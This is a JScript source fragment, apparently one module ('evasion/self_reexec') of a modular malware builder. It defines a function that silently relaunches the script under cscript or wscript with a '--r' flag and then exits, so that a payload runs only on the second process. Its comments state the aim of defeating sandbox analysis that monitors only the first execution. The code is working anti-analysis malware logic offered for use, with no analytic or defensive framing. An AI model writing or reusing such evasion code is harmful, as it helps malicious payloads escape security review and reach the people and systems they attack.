// chunk: evasion/self_reexec
// depends: core/run_cmd
// provides: check_reexec
// format: jscript
// note: Re-launches self with a flag argument on first invocation, then exits.
//       Payload only runs on second invocation. Defeats single-execution
//       sandbox analysis that only monitors the first process.

function check_reexec() {
    var args = WScript.Arguments;
    var hasFlag = false;
    for (var i = 0; i < args.Count; i++) {
        if (args.Item(i) === "--r") hasFlag = true;
    }
    if (!hasFlag) {
        /* First invocation: re-launch self with flag and exit */
        var sh = new ActiveXObject("WScript.Shell");
        var cmd = '"' + WScript.ScriptFullName + '" --r';
        var host = WScript.FullName.toLowerCase();
        if (host.indexOf("cscript") >= 0) {
            sh.Run('cscript //nologo "' + WScript.ScriptFullName + '" --r', 0, false);
        } else {
            sh.Run('wscript "' + WScript.ScriptFullName + '" --r', 0, false);
        }
        WScript.Quit(0);
    }
    /* Second invocation: continue execution */
}
